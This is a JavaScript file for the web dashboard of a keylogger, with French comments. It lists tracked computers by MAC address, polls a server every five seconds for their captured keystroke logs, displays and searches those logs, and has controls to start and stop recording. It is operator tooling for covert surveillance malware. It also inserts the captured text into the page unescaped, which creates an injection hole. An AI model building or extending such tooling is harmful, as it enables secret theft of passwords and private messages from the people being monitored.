let logData = [];

document.addEventListener("DOMContentLoaded", function () {
    const computerSelect = document.getElementById("computer-list");
    const logContent = document.getElementById("log-content");
    const mainMessage = document.getElementById("main-message");
    const recordingStatus = document.getElementById("recordingStatus");

    async function fetchComputers() {
        const response = await fetch('/get_users');
        const data = await response.json();
        computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';
        for (const mac in data) {
            const option = document.createElement('option');
            option.value = mac;
            option.textContent = mac;
            computerSelect.appendChild(option);
        }
    }

    async function fetchData() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return;

        const response = await fetch('/get_data');
        const data = await response.json();
        logData = data[selectedMac] || [];
        displayContent(logData);
    }

    function displayContent(content) {
        logContent.innerHTML = content.map(item => `<p>${item}</p>`).join('');
    }

    function searchContent(query) {
        if (!query) return displayContent(logData);
        const filtered = logData.filter(text => text.includes(query));
        displayContent(filtered);
    }

    async function startKeylogger() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return alert("Please select a computer!");
        
        await fetch('/start_keylogger', { method: 'POST' });
        recordingStatus.style.display = "block"; // Afficher "Recording in progress..."
        mainMessage.style.display = "none"; // Cacher le message principal
    }

    async function stopKeylogger() {
        await fetch('/stop_keylogger', { method: 'POST' });
        recordingStatus.style.display = "none"; // Cacher "Recording in progress..."
        mainMessage.style.display = "block"; // Réafficher le message principal
    }

    computerSelect.addEventListener("change", function () {
        if (computerSelect.value) {
            mainMessage.style.display = "none"; // Cache le message principal
            recordingStatus.style.display = "block"; // Affiche "Recording in progress..."
            fetchData();
        }
    });

    fetchComputers();
    setInterval(fetchData, 5000);
});
